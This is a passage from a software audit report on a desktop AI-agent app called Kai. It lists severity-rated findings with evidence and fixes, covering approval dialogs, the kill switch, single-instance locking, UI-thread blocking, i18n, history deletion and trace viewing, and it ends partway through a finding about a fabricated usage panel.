  - No lock/mutex/socket check anywhere in scope (no `single_instance`, no named mutex, no lock file).
- **Impact:** Two instances both drive Enigo during runs — interleaved synthetic input wrecking each other's clicks; the kill switch only stops the instance whose hotkey registered; settings and local model state are last-writer-wins. A user who double-launches gets a quietly broken second window.
- **Fix:** Acquire a single-instance lock before starting the agent (lock file in `Settings::dir()` with `flock`/`LockFileEx`, or a named mutex on Windows). If held, focus/raise the existing window (or print a message on failure) and exit(0). Tie the lock's lifetime to the process.

#### [APP-SH-03] Closing the mini window mid-run removes the only visible approval surface
- **Severity:** HIGH
- **Location:** crates/kai-app/src/mini.rs:57-64, runs.rs:162-167 and 375-386; vendor/ely-gpui-component/src/shell/windows.rs:261-265
- **What:** Run launch minimizes the main window and relies on the mini window for all in-run UI. The mini window's hover bar includes a close button that calls `window.remove_window()` directly on the Ely `MiniWindow`; Kai's `Open(Option<WindowHandle>)` global is only ever cleared by `mini::close` (nothing observes the window disappearing). Approvals render in the main window (and in mini), but unlike typing human checks, an arriving `Ui::Approval` never raises the minimized main window (`runs.rs` raises it only for `h.check.accepts_code()/accepts_answer()`).
- **Evidence:**
  - `windows.rs:262-264` — `IconButton::new("mini-close", IconName::X).on_click(|_, window, _| window.remove_window());`
  - `mini.rs:59-62` — `Open` is only reset in `mini::close`, called from the run loop after it ends (`runs.rs:203`).
  - `runs.rs:163-166` — `mini::open(...); if self.capture.is_none() { window.minimize_window(); }`; `runs.rs:177-193` raises the main window only for typing checks.
- **Impact:** One click (or an OS-initiated window close) during a run leaves the run parked on an approval with no UI anywhere — the main window is minimized and never raised for approvals. The run stalls until the user restores the main window by dock/hotkey; if the hotkey failed to register there is no hint at all.
- **Fix:** Observe mini-window closure (`cx.observe_window_closes`, or check the stored handle's validity) and clear `Open` and raise the main window; alternatively raise the main window for `Ui::Approval` whenever no live mini window exists, and give the mini bar an explicit "show main window" action instead of a bare X while a run is live.

#### [APP-SH-04] Mouse/keyboard backend is built synchronously on the UI thread, retried from Home's render path
- **Severity:** MEDIUM
- **Location:** crates/kai-app/src/agent.rs:120-135 and 143-152; crates/kai-os/src/input.rs:110-145
- **What:** `can_act()` calls `actuator()`, which rebuilds the hands inline (`hands(&self.kill)`) whenever a previous attempt failed and `HANDS_RETRY` (2 s) has elapsed. Building the hands goes through `kai_os` `Input::spawn`, which blocks on `ready_rx.recv()??` until the Enigo worker reports initialization (permission prompts/event-tap setup on macOS, backend connect on Linux). Home's render calls `can_act()` on every repaint, so a failing hands init re-blocks the UI thread up to once every 2 seconds of repaints. `Agent::run` also calls `self.actuator()` inline from `runs.rs::launch` (UI thread).
- **Evidence:**
  - `agent.rs:124-133` — doc comment "this runs on every repaint of Home"; `if h.now.is_none() && h.tried.elapsed() >= HANDS_RETRY { h.now = hands(&self.kill)… }`.
  - `input.rs:145` — `ready_rx.recv()??;` inside `Input::spawn`.
  - `runs.rs:153-160` — `agent.run(...)` invoked directly from the launch handler.
- **Impact:** Frame hitching and input lag exactly when the user is trying to click Stop/Approve after resolving a permission prompt; a hung input backend freezes the UI rather than degrading.
- **Fix:** Move hands creation to `cx.background_executor()`/`tokio::task::spawn_blocking`, swap the slot and `cx.notify()` on completion; make `can_act()` a cheap cached read.

#### [APP-SH-05] i18n: Ely's catalog is installed but dead, while a parallel table covers only part of the strings
- **Severity:** MEDIUM
- **Location:** crates/kai-app/src/i18n.rs:31-51 (plus hardcoded strings across in-scope files)
- **What:** `install()` sets Ely's global `I18n` with a single key `kai.ready` that nothing in the workspace looks up, while Kai's own strings go through a hand-rolled free function `t()` over a 19-entry `EN` table. Many user-visible strings bypass both (e.g. `state.rs:241,251` "Waiting for you: …", `app.rs:183` "Settings not saved", `approval.rs` button labels and detail, `switcher.rs:91,113`, settings labels). A missing key logs and falls back to the key text.
- **Evidence:**
  - `i18n.rs:33` — `.catalog("en-US", &[("kai.ready", "Ready")])` — no lookup of `kai.ready` exists.
  - `i18n.rs:38-46` — `t()` finds in `EN`, else `log::error!("strings: no {key:?}")` and returns the key.
  - `grep`: none of the strings above appear in `EN`.
- **Impact:** The i18n story looks wired but is not — Ely's mechanism is dead weight, coverage is partial, and misses degrade silently at runtime. Conflicts with DECISIONS.md's "English-only UI strings" decision, which the stray Ely install contradicts.
- **Fix:** Pick one mechanism: either route `t()` through `cx.global::<I18n>()` (with a logged fallback around its panic-on-missing) or drop the Ely install entirely and extend `EN`, adding a test that every `t("…")` literal in the crate exists in the table.

#### [APP-SH-06] Status-bar render can re-read the model catalog from disk every frame
- **Severity:** MEDIUM
- **Location:** crates/kai-app/src/local.rs:117-128; caller crates/kai-app/src/switcher.rs:72-78
- **What:** `LocalState::label` falls back to `load_catalog()` — a full file read plus JSON parse — whenever the id is missing from `ranked`. `installed_local()` maps every installed model through `label(id)` during status-bar rendering, so before hardware detection completes (or for ids `rank` doesn't list) each repaint re-reads and parses the catalog on the UI thread, once per installed model.
- **Evidence:**
  - `local.rs:117-127` — `.or_else(|| load_catalog().models.into_iter().find(|e| e.id == id).map(|e| e.label))`.
  - `switcher.rs:72-78` — `installed_local` iterates `l.installed` calling `l.label(id)`.
  - `switcher.rs:119-125` — `switcher()` is built by the status bar each render.
- **Impact:** Intermittent per-frame disk I/O during startup (when the UI is busiest) and any state where `ranked` lags; cost scales with downloaded models.
- **Fix:** Load the catalog once (e.g. `OnceLock<Catalog>` refreshed when installs change) or store the label in `installed` when it is populated.

#### [APP-SH-07] Quit abandons an in-flight run without tripping the kill switch or settling decisions
- **Severity:** MEDIUM
- **Location:** crates/kai-app/src/local.rs:436-443; crates/kai-app/src/nav.rs:52-54
- **What:** The only `on_app_quit` handler stops the local llama-server. Quitting mid-run (macOS ⌘Q, window close on other platforms) does not trip `agent.kill`, does not answer pending approvals/human checks, writes no final trace, and silently drops an in-flight local model download. The running `agent.run`/`local_job` tasks are simply torn down with the process.
- **Evidence:**
  - `local.rs:438-441` — `cx.on_app_quit(move |_| { let _ = manager.stop(); async {} })` — the sole quit hook.
  - `nav.rs:54` — `cx.on_action(|_: &Quit, cx| cx.quit());`.
  - No `kill.trip`, `take_all`, or `stop_everything` appears in any quit path (grep).
  - `runs.rs:196-202` shows the intended "settle the run" shape, but only for the rx-closed case.
- **Impact:** A user quitting mid-run loses the run silently: partial download left on disk, queued runs discarded, no trace line for the abandoned step in History — making a crash and a deliberate quit look alike.
- **Fix:** Register a quit hook that, for every live run, trips the kill switch via `RunControl`/`agent.kill`, answers every pending approval/human with Stop (`take_all`), and lets the manager stop; then return.

#### [APP-SH-08] Stop/answer plumbing is implemented three times and has already drifted
- **Severity:** MEDIUM
- **Location:** crates/kai-app/src/runs.rs:262-278, 281-309, 427-437; crates/kai-app/src/mini.rs:101-123
- **What:** "Take every approval/check and send Stop/reply" exists three times (`KaiApp::stop`, `stop_run`, `MiniView::stop_all`), and answer plumbing twice (`runs::answer` vs `mini::answer`). The copies are not equivalent: `mini::answer_human` unconditionally flips the phase and never clears `human_draft`, while `runs::answer_human` guards the phase and clears the draft (SH-09).
- **Evidence:**
  - `runs.rs:267-275`, `runs.rs:298-304`, `mini.rs:113-122` — same `take_all` loop, each with its own sends.
  - `runs.rs:389-398` vs `mini.rs:127-131` — the divergent human-answer paths.
- **Impact:** Behavior drifts between the main window and mini window controls; every future fix must be applied two or three times; reviewers cannot trust one control to match another.
- **Fix:** Give `RunState`/`KaiApp` single helpers (`stop_everything(&Entity)`, `answer`, `answer_human`) and call them from both windows; delete the mini copies.

#### [APP-SH-09] `mini::answer_human` flips `Phase::Running` with no pending check
- **Severity:** MEDIUM
- **Location:** crates/kai-app/src/mini.rs:126-134; sibling crates/kai-app/src/runs.rs:389-394
- **What:** The mini window's human answer sets `r.phase = Phase::Running` before calling `take_human()`, regardless of whether a human check is pending. `Phase::Waiting` is also the phase for a pending approval, so a stray activation can move a run from Waiting (on an approval) to Running while the approval is still unanswered. The main-window version guards on `Phase::Waiting` but the guard is not precise for the same reason.
- **Evidence:**
  - `mini.rs:127-131` — `r.phase = Phase::Running; cx.notify(); r.take_human()`.
  - `runs.rs:390-392` — `if r.phase == Phase::Waiting { r.phase = Phase::Running; }` — same imprecision, at least guarded.
  - `state.rs:235-255` — approvals and human checks both set `Phase::Waiting`.
- **Impact:** Phase and visible queues disagree (caption resets, `is_live`/held logic read a wrong phase) until the next engine event; the approval card and the "running" caption coexist.
- **Fix:** Move the transition into `RunState` itself: flip to Running only inside `take_human()`/`answer_approval()` when something was actually taken.

#### [APP-SH-10] Capture exclusion is snapshotted once per launch and goes stale when windows move
- **Severity:** MEDIUM
- **Location:** crates/kai-app/src/runs.rs:163-167; crates/kai-app/src/mini.rs:66-98
- **What:** `mini::exclude_windows` collects current window rects (and Win32 exclusion flags) exactly once, right after launch. The mini window is user-draggable (Ely's hover bar drag region) and the main window is raised/minimized mid-run for typing checks, so both can move after the snapshot; nothing refreshes the mask.
- **Evidence:**
  - `runs.rs:167` — single `mini::exclude_windows(&agent, cx);` call before the run loop.
  - `mini.rs:68-97` — rects collected from `cx.windows()` at that instant and handed to `crate::agent::exclude(&agent.perceptor, rects)`.
  - `vendor/.../windows.rs:215-243` — the mini bar is a drag region; `runs.rs:186-193` re-raises the main window mid-run.
- **Impact:** On Linux, Kai's own transcript/approval UI can reappear inside the model's screenshots after the mini window moves — the model reads its own output (feedback loop and a prompt-injection surface). Windows is per-HWND and unaffected; macOS has no exclusion (documented masking limitation), so the stale-rect issue is Linux-specific but silent.
- **Fix:** Re-run `exclude_windows` whenever a window moves/resizes (observe bounds changes) or immediately before each capture; at minimum refresh the snapshot on human-check raise/minimize and document the boundary in DECISIONS.md.

#### [APP-SH-11] `Ui::Failed` leaves approval/check queues populated, so a dead approval card outlives the run
- **Severity:** MEDIUM
- **Location:** crates/kai-app/src/state.rs:297-303; the synthetic failure path crates/kai-app/src/runs.rs:196-202
- **What:** `Ui::Failed` sets `Phase::Done`, stores the error and clears `human`, but does not call `take_all()` — `approval`, `approvals_waiting` and `humans_waiting` stay. `runs.rs`'s post-loop path applies exactly this failure ("The run ended without a result.") when the engine channel closes with the run still live — the same scenario in which an approval may be pending with its reply receiver already dropped.
- **Evidence:**
  - `state.rs:297-303` — Failed: phase/thinking/error/human only; contrast `state.rs:272-275` (Finished) which does `take_all()`.
  - `runs.rs:197-202` — `if r.is_live() { r.apply(Ui::Failed(...)) }` after `rx` ends.
  - `runs.rs:435` — answering sends into the dropped oneshot with `let _ = …send(choice)` (no error surfaced).
- **Impact:** After a failure the approval dialog can stay on screen; clicking it does nothing (receiver gone) until the user Escapes, and it covers the failure UI.
- **Fix:** Call `self.take_all()` in `Ui::Failed` as well (or factor a `settle_pending()` used by both Finished and Failed).

#### [APP-SH-12] An approval and a human check can stack as two dialogs with no coordination
- **Severity:** MEDIUM
- **Location:** crates/kai-app/src/state.rs:235-257; crates/kai-app/src/app.rs:457-460
- **What:** Approval and human pending states are independent queues, so both can be active at once (Team mode: one sub-agent asks for approval while another reaches a human check; both set `Phase::Waiting`). Render builds both dialogs and appends them in order, human after approval — two scrims, two focus-owning dialogs, one visible decision (human) covering the other.
- **Evidence:**
  - `state.rs:235-246` and `state.rs:248-255` — each shows immediately without checking the other.
  - `app.rs:375-386` — both built from `active_state()`; `app.rs:458-459` — `.children(approval).children(human)`.
- **Impact:** A user answers one decision while the other silently waits underneath; after the repaint the second card appears from nowhere. Tab/Escape reach whichever dialog Ely focused last, so keyboard behavior depends on render order.
- **Fix:** Render one decision layer: pick from a single ordered queue (e.g. human checks over approvals, or FIFO across both) with an "N more waiting" indicator, keeping the other queued until answered.

#### [APP-SH-13] Same serialization is `expect`ed in one place and silently emptied in another
- **Severity:** LOW
- **Location:** crates/kai-app/src/approval.rs:103-105; crates/kai-app/src/state.rs:344
- **What:** The transcript path serializes a `Decision` with `unwrap_or_default()` (blank JSON on failure) while the approval dialog `expect`s the same serialization to succeed.
- **Evidence:**
  - `approval.rs:104` — `serde_json::to_string_pretty(decision).expect("Decision serializes without fallible values")`.
  - `state.rs:344` — `json: serde_json::to_string_pretty(&*decision).unwrap_or_default(),`.
- **Impact:** For the same input one path panics and the other shows an empty panel; the two-policy split invites a lurking mismatch if a non-finite float or map key ever slips into `Decision`.
- **Fix:** Serialize once (shared helper returning `Result`), pick one degradation policy, and keep the panic only on a by-construction invariant.

#### [APP-SH-14] Stale doc reference (`human.rs`) in asks.rs
- **Severity:** LOW
- **Location:** crates/kai-app/src/asks.rs:41-42
- **What:** The comment says "…the mini window and the main window's dialog (see `human.rs`)" — there is no `human.rs`; the module is `human_dialog.rs`.
- **Evidence:** `asks.rs:42` — "(see `human.rs`)."
- **Impact:** Doc rot; readers chasing the reference find nothing.
- **Fix:** Point at `crate::human_dialog` (and optionally the pipeline in `runs.rs`).

#### [APP-SH-15] `build.rs` host-`cfg` silently skips the Windows icon on cross-compiles
- **Severity:** LOW
- **Location:** crates/kai-app/build.rs:9-20
- **What:** `#[cfg(windows)]`/`#[cfg(not(windows))]` in a build script test the **host**, not the target. Cross-compiling to Windows (or any `--target` build on a non-Windows host) compiles the no-op `embed_icon` and ships an executable with no Explorer/taskbar icon; the `cargo:warning` at line 15 never fires either.
- **Evidence:**
  - `build.rs:9` / `build.rs:19` — host `cfg(windows)` gate.
  - `build.rs:14-15` — the "icon left out" warning lives only in the Windows branch.
  - DECISIONS.md documents CI building each OS natively, which masks the gap today.
- **Impact:** Only affects cross-compiled builds; the failure is silent (icon-less exe, no warning).
- **Fix:** Branch on `std::env::var("CARGO_CFG_WINDOWS").is_ok()` (target cfg) so cross builds either embed or warn honestly.

#### [APP-SH-16] `local_api.rs` is an internal facade; the name promises an API surface
- **Severity:** LOW
- **Location:** crates/kai-app/src/local_api.rs:1-8
- **What:** The module wraps `kai_core::models` and `kai_os::local` "behind the small surface the Models page and onboarding were written against". Nothing here serves, authenticates, or exposes requests — there is no HTTP/local API in the app (the model server binds loopback only, in kai-os).
- **Evidence:**
  - `local_api.rs:1-3` — "The local-models API as the app uses it…".
  - `local_api.rs:40` — "Thin wrapper over [`kai_os::local::LocalManager`]".
- **Impact:** Misleads audits and newcomers (an "API exposure/auth" search lands here and stops); renaming later is churn across imports.
- **Fix:** Rename to `local_models.rs`/`models_runtime.rs` or fold into `local.rs`; keep the intent in the doc comment.

#### [APP-SH-17] Startup panics (`expect`) instead of diagnosable exits
- **Severity:** LOW
- **Location:** crates/kai-app/src/main.rs:76, 130
- **What:** `ely_gpui_component::init(cx).expect("Ely failed to start")` and `open_window(...).expect("Kai's window failed to open")` panic on runtime-environment failures (no display server, Wayland oddities, asset load failure). The agent-start failure a few lines earlier exits cleanly with `eprintln!` + `exit(1)`.
- **Evidence:**
  - `main.rs:76` — `.expect("Ely failed to start")`.
  - `main.rs:130` — `.expect("Kai's window failed to open")`.
  - `main.rs:63-68` — the contrasting clean-exit pattern for agent start.
- **Impact:** A backtrace instead of a message a user (or deploy script) can act on; no clean exit code.
- **Fix:** Match on both and exit(1) with the error text, mirroring the agent-start path.

#### [APP-SH-18] Approves inside the 600 ms grace window are ignored with no feedback
- **Severity:** LOW
- **Location:** crates/kai-app/src/state.rs:95, 110-122
- **What:** `APPROVE_GRACE` (600 ms) deliberately ignores an Approve that arrives right after the card appears (anti-click-through / anti-double-click). But the ignored click produces no visible reaction: the dialog stays up, and `answer_approval` returns `None` (the pending is not taken), so the user sees a dead button.
- **Evidence:**
  - `state.rs:95` — `pub const APPROVE_GRACE: Duration = Duration::from_millis(600);`.
  - `state.rs:115-122` — Approve within the window logs and returns `None`; Skip/Stop always pass.
  - `runs.rs:427-436` — `answer` sends only when a `Pending` comes back.
- **Impact:** Minor UX confusion; the safety intent (a click aimed at something else cannot approve a fresh card) is sound and covered by tests, but the UI doesn't explain the refusal. Note: the design is deliberate per state.rs comments/tests but is not recorded in DECISIONS.md.
- **Fix:** Show the Approve button in a brief "checking what you saw" disabled/loading state for `APPROVE_GRACE` after a card appears (or hover-reveal the reason), so the ignored click reads as intentional.

#### [APP-SH-19] `ui.rs` test compiles a file straight out of the vendor tree
- **Severity:** LOW
- **Location:** crates/kai-app/src/ui.rs:371-374
- **What:** A test module includes vendored Ely source by relative path (`#[path = "../../../vendor/ely-gpui-component/src/layout/scroll_policy.rs"]`), so `cargo test` breaks with a path error if the vendor tree moves or the crate is built outside the workspace layout.
- **Evidence:**
  - `ui.rs:372-374` — `#[cfg(test)] #[path = ".../vendor/ely-gpui-component/src/layout/scroll_policy.rs"] mod scroll_policy_contract;`.
- **Impact:** A maintainability trap rather than a runtime bug; the contract under test is invisible to Ely's own version pin.
- **Fix:** Copy the policy into a fixture the test owns, or exercise the contract through public behavior; if kept, comment the tie to the vendor pin (there is already one short comment).

### Not needed / remove

- The Ely `I18n` install plus the `kai.ready` catalog entry (i18n.rs:31-35) — nothing reads either; delete or wire `t()` through it (SH-05).
- `local_api.rs` as a distinct module name — fold into `local.rs` or rename (SH-16).
- The vendor-path `#[path]` test include (ui.rs:371-374) — replace with a fixture or behavior test (SH-19).
- The mini-window copies of stop/answer (`mini.rs:101-123`) once shared helpers exist (SH-08).
- No dead TODOs/FIXMEs/HACKs found to remove — the tree is clean of markers.

### What's good

- Approval/HumanCheck safety: one-shot reply channels, send-drop and reply-drop both answer Stop (`asks.rs:32-37,57-64`), `take_all` on Stop answers every queued decision (`state_tests.rs` `stopping_answers_every_queued_approval_and_check`), the grace window blocks click-through Approves (`state.rs:110-122`), and Escape/scrim on the approval dialog answers Stop with the exact-action JSON displayed (approval.rs).
- GPUI discipline: `cx.observe(...).detach()` lifetimes, `cx.notify()` on mutation, `Arc<[u8]>` screenshot frames (no per-event clone cost), keyed page animations, `FocusScope` root, and a single `ToastViewport` — all house-idiom.
- The tokio bridge is conservative: one unbounded channel per run carrying one message per step (bounded backpressure by design), per-run tasks end when `running` goes false (`watch_corner` exits), and the kill switch tripping shared state is the cross-cutting stop mechanism.
- Focused tests where state is tricky: `state_tests.rs` (balance/queues/Stop), `follow.rs` (10 tests), `control.rs` (stop-release, both-stop), `errors.rs` (next-step phrasing), the i18n key-uniqueness test, brand contrast tests, and the `keys.rs` source-guard that keeps keychain access off the UI thread.
- Assets: app icon (512 PNG), mark, and `Kai.ico` all present and embedded; splash-to-window handoff removes the splash cleanly; `build.rs` rerun-if-changed is wired.

### Open questions

- Should `Ui::Approval` raise the main window when no mini window exists, the same way typing human checks already do? (SH-03)
- Should a second instance focus the first and exit, or start with the agent disabled? (SH-02)
- Is quitting with a live run meant to abandon it silently, or should it kill the run and write a final trace? (SH-07)
- Should `APPROVE_GRACE` move into DECISIONS.md, and should the ignored Approve be visible in the UI? (SH-18)
- Is the Linux stale-mask behavior (own window re-entering captures after a move) acceptable, or should exclusion refresh on window move? (SH-10)

---

## 3.8 APP-UX — Pages, onboarding, UI/UX & fillers

*Reviewed files: 25. Findings: 0C / 2H / 8M / 6L / 0I.*

Deep review of the kai-app pages, onboarding, and the UI/UX-support files. Read-only: no repo file was modified; this fragment is the only output.

### Scope checklist

| File | Lines | Verdict |
| --- | --- | --- |
| `crates/kai-app/src/pages/mod.rs` | 240 | Clean state routing (idle/queued/running/waiting/done); compact (<1100px) single-pane with collapsible task list works as designed. |
| `crates/kai-app/src/pages/home.rs` | 420 | Strong hierarchy and honest status line, but STARTERS are hardcoded to six built-in skills and the "Start from a skill" heading renders with zero cards. |
| `crates/kai-app/src/pages/running.rs` | 482 | Complete live view (steps/terminal/screen tabs, steering, jump-to-latest); the Usage panel is fabricated from constants. |
| `crates/kai-app/src/pages/done.rs` | 330 | Outcome, outputs, save-as-skill all present; "View trace" opens the wrong trace for revisited runs, and the time-limit hint points at a nonexistent control. |
| `crates/kai-app/src/pages/history.rs` | 349 | Honest empty state, export, timeline + frames; reads trace.json and enumerates frames synchronously during render. |
| `crates/kai-app/src/pages/sessions.rs` | 307 | Best accessibility in the app: named rows, tab stops, focus ring, reveal-on-focus, scroll-to-item. |
| `crates/kai-app/src/pages/skills.rs` | 488 | Import/draft/disable/details all work; no delete action, no benchmark runs in details (DESIGN.md:298), no no-results state; per-frame disk reads. |
| `crates/kai-app/src/pages/skills_tests.rs` | 38 | Focused regression tests for the skills page; fine. |
| `crates/kai-app/src/pages/capture.rs` | 492 | Env-gated (`KAI_CAPTURE*`) screenshot walker with fake data; test-only, not shipping UI. |
| `crates/kai-app/src/pages/capture_models.rs` | 146 | Same capture fixture for the models page; test-only. |
| `crates/kai-app/src/pages/bench.rs` | 480 | Results table works; Run silently no-ops when the sibling `kai` binary is missing and is mock-only. |
| `crates/kai-app/src/pages/memory.rs` | 232 | Clear memory + confirm dialog consistent with settings; good. |
| `crates/kai-app/src/pages/models.rs` | 247 | Hardware panel, catalog states, fit badges coherent. |
| `crates/kai-app/src/pages/models_card.rs` | 317 | Shared card/badges keep local and hosted models consistent. |
| `crates/kai-app/src/pages/models_store.rs` | 139 | Store/status helpers read the same local state; no duplication found. |
| `crates/kai-app/src/pages/model_settings.rs` | 272 | U06/U11 fixed: keychain off the render path, labeled backend Select; clear hints. |
| `crates/kai-app/src/pages/settings.rs` | 311 | Functional, but "Delete all history" misses training data its dialog promises to remove, and Safety is a wall of 11 "— experimental" switches. |
| `crates/kai-app/src/pages/panes.rs` | 279 | Latency/step panes consistent with brand tokens; fine. |
| `crates/kai-app/src/onboarding/mod.rs` | 416 | Step gating is real (backends/keys/local readiness), demo run wired; polite setup copy. |
| `crates/kai-app/src/onboarding/steps.rs` | 159 | Access/safety/try-it are honest and testable; hotkey conversion round-trip tested. |
| `crates/kai-app/src/onboarding/local.rs` | 161 | One-tap local flow with Cancel/Try again; spinner can persist forever if the hardware probe fails. |
| `crates/kai-app/src/brand.rs` (cross-check) | 143 | Palette + WCAG AA tests incl. subtle text and ember-as-text. |
| `crates/kai-app/src/ui.rs` (cross-check) | 374 | Shared glass/page/empty helpers; vendor scroll-policy contract test embedded. |
| `crates/kai-app/src/state.rs` (cross-check) | 468 | Run-state machine is coherent; Waiting can briefly precede approval/human payloads. |
| `crates/kai-app/src/i18n.rs` (cross-check) | 63 | Only 19 keys exist while most pages hardcode copy. |

### Verdict

The app's core loop (home → live run → done → history) is genuinely well-built: state routing in `pages/mod.rs:141–189` covers queued/live/done/compact without dead ends, the session rail is the best keyboard-accessible surface in the product (`sessions.rs:90–130`), and the brand layer is disciplined — every text token is contrast-tested (`brand.rs:113–142`) and shared through `ui.rs`. Visually this reads as one designed product, not a sampled component kit; empty states, status dots, and the glass treatment are consistent across pages.

The honesty cracks are in the details. "Delete all history" claims "Every saved run and its screenshots are removed" but only removes `traces_dir`; training data the same Privacy section advertises (`runs_dir`, prompts/replies/screenshots) survives with no UI to see or delete it (`settings.rs:156–168`, `settings.rs:248–265`). The live "Usage" panel renders constants — "This step's context" is always 1,400 tokens (`running.rs:27–28`, `running.rs:304–332`) — in a visual language that reads as measurement; only the small print discloses estimates. Benchmarks ship a "Run benchmark (mock)" button that can also silently do nothing.

Flows are mostly complete but three gaps stand out: "View trace" opens `history.first()` (newest trace), not the finished run's trace, so revisiting an older run shows someone else's timeline (`done.rs:220–230`); the TimeLimit outcome tells users to raise a limit that has no control (`done.rs:28–29` vs `settings.rs:77–79`); and skills have no delete, no no-results state, and drop the design-promised benchmark runs (`skills.rs:165–203`, DESIGN.md:298). Onboarding is otherwise solid: readiness gates are real, the demo task is genuinely safe, and the safety copy ("Autopilot still always asks for payments and passwords", `steps.rs:97`) is accurate.

Scores (1–10):

| Dimension | Score | Why |
| --- | --- | --- |
| Visual design | 8 | Cohesive Kai Glass tokens, tested palette, deliberate orb/type hierarchy; only Settings' switch wall and the empty starter section feel unedited. |
| UX flows | 6 | Core loop and all run states are mapped with a compact fallback, but View-trace wiring, delete-history scope, and missing skill delete are real flow breaks. |
| Accessibility | 7 | Named rail items, tab-stop task rows with aria labels and focus rings, contrast tests; mini-window no-op presses and the non-interactive frame strip remain, and screen-reader behavior was never live-verified. |
| Consistency | 6 | Tokens/typography are uniform, yet most copy bypasses the 19-key i18n table and DESIGN.md drifts from code (steering, benchmark runs). |
| Honesty | 6 | Estimates are disclosed and mock benchmarking is labeled, but delete-all copy overstates its scope and the time-limit hint points at a control that doesn't exist. |
| Maintainability | 6 | Pure policies (`follow.rs`) and guard tests (`keys.rs:38`) are excellent, but render paths do synchronous disk I/O and experimental switches multiply without owners. |

### Prior audit status (docs/UI_UX_AUDIT_2026_10_16.md)

All sixteen findings verified fixed at source level in current code:

| Finding | Status | Current-code evidence |
| --- | --- | --- |
| U01 single-pane under 1100px | Fixed | `pages/mod.rs:135–137` `compact_run`; toggle + collapsible sidebar `pages/mod.rs:156–182`. |
| U02 nested scroll wheel clamping | Fixed | Vendor `scroll_policy` clamp plus in-workspace contract test `ui.rs:371–374`. |
| U03 FG_SUBTLE contrast | Fixed | `brand.rs:114–127` tests include `FG_SUBTLE` on canvas and surface ≥4.5:1. |
| U04 capture crops first monitor | Fixed | `capture.rs:108–128` selects exactly one window by PID/title; env-gated fixtures. |
| U05 follow-newest transcript policy | Fixed | `follow.rs` pure policy (END_SLACK/AT_END) + jump button `running.rs:146–199`. |
| U06 keychain read on Settings render | Fixed | `model_settings.rs:104–105` blank-keeps-existing hint; UI-thread guard test `keys.rs:38`. |
| U07 rail/task roles | Fixed | `app.rs:328–359` named `ActivityBar` items; aria/tab/role rows `sessions.rs:114–130`. |
| U08 focus into clipped rows | Fixed | Reveal-once per focus entry `sessions.rs:98–106` (`scroll_to_item`). |
| U09 Screen painting under composer | Fixed | `running.rs:428–438` bounded viewport + `overflow_hidden()`. |
| U10 sized page ScrollAreas | Fixed | e.g. `skills.rs:153–160` scrolls a sized area; pages use `ui::page` inside sized scroll views. |
| U11 backend dropdown | Fixed | `model_settings.rs:187` labeled `Select::new("backend", …)`. |
| U12 history empty-state copy | Fixed | `history.rs:242–252` "Saved runs appear here… Recording is controlled in Settings › Privacy." |
| U13 keychain off UI thread | Fixed | `keys.rs:9` async resolve on blocking pool + `keys.rs:38` guard test. |
| U14 single-key validation | Fixed | kai-core decision schema (out of this fragment's scope; verified during cross-check). |
| U15 approval JSON both-axes scroll | Fixed | `approval.rs:70–79` vertical ScrollArea wrapping `SelectableText`. |
| U16 task rows not tabbable | Fixed | `sessions.rs:94` tracked handle with `.tab_stop(true)`. |

### Findings

#### APP-UX-01 "View trace" opens the newest trace, not the finished run's trace
**Severity:** HIGH
**Location:** `crates/kai-app/src/pages/done.rs:220–230` (with `pages/history.rs:30–50`)
**What:** The done page's "View trace" reloads History and selects `history.first()`. History is sorted newest-first, so for any run other than the very latest the button opens a different run's trace under this run's context.
**Evidence:**
```rust
.on_click(move |_, _, cx| {
    trace.update(cx, |a, cx| {
        a.pages.reload_history();
        a.pages.open_trace = a.pages.history.first().map(|e| e.dir.clone());
```
`history.rs:30`: "Every run folder with a readable trace, newest first." / `history.rs:49` sorts `Reverse(e.at)`.
**Impact:** Users inspecting an older finished run are silently shown another task's timeline, steps, and frames — a misleading artifact in a review/audit surface. Exact frequency: high if users revisit runs (the sessions sidebar invites it).
**Fix:** Record the trace directory (or run start timestamp) on `RunState` when the run starts, and have the button select the matching history entry by `e.dir == run.trace_dir` (fall back to newest only when unknown). Add a test: two finished runs, revisit the older, View trace yields the older `trace.json`'s task text.

#### APP-UX-02 "Delete all history" doesn't delete the training data its dialog promises
**Severity:** HIGH
**Location:** `crates/kai-app/src/pages/settings.rs:156–168`, `248–265` (with `crates/kai-app/src/agent.rs:348–372`)
**What:** The confirm dialog says "Every saved run and its screenshots are removed from this computer," but the handler removes only `Settings::traces_dir()`. When "Keep runs as training data" is on, `runs_dir` (prompts, replies, and `frames/step-NNN.jpg` screenshots) survives with no UI showing its size or offering deletion. The "Saved runs — N runs on disk" row counts traces only, so the number doesn't even describe the training data it sits beside.
**Evidence:**
```rust
ConfirmDialog::new("confirm-delete", "Delete all history?", "Every saved run and its screenshots are removed from this computer. This can't be undone.", …)
…
let r = std::fs::remove_dir_all(Settings::traces_dir());
```
**Impact:** Users who rely on the dialog to reclaim disk space or remove screenshots of their screen keep an unbounded second copy on disk. This is a data/privacy trust bug, not just polish.
**Fix:** Either delete both directories (with a checkbox: "also delete training data") or correct the copy to name exactly what is removed, add a "Training data — N runs, X MB" row with its own delete button, and add a test asserting the dialog strings match the removed paths.

#### APP-UX-03 Home starters hardcode six built-in skills; heading renders with zero cards
**Severity:** MEDIUM
**Location:** `crates/kai-app/src/pages/home.rs:22–53`, `135–139`, `380–395`
**What:** `STARTERS` is a fixed list keyed to six built-in skill names and filtered against installed skills, so a user's own skills never appear as starter cards despite the comment "One starter per skill". When none of the six are installed (or all filtered out), the grid is empty but the "Start from a skill" eyebrow still renders above it.
**Evidence:**
```rust
const STARTERS: &[(&str, &str, IconName)] = &[
    ("open-and-search-web", "Open bmsce.ac.in and find the IEEE CS page", IconName::Globe),
```
```rust
let starters: Vec<(&str, &str, IconName)> = STARTERS.iter()
    .filter(|(skill, ..)| app.skills.iter().any(|s| s.front.name == *skill)).copied().collect();
```
`home.rs:386` renders `ui::eyebrow("Start from a skill", cx)` unconditionally.
**Impact:** The home page's most useful affordance advertises a feature that is invisible for custom skills, and can show a bare heading with no content — reads as a loading bug.
**Fix:** Derive starters from installed skills (fall back to STARTERS examples only when the list is empty, labeled "Try an example"), or hide the whole section when `cards` is empty. Rename the constant if it's intentionally a fixed sampler.

#### APP-UX-04 Live "Usage" panel is fabricated constants that read as measurements
**Severity:** MEDIUM
**Location:** `crates/kai-app/src/pages/running.rs:27–28`, `304–332`
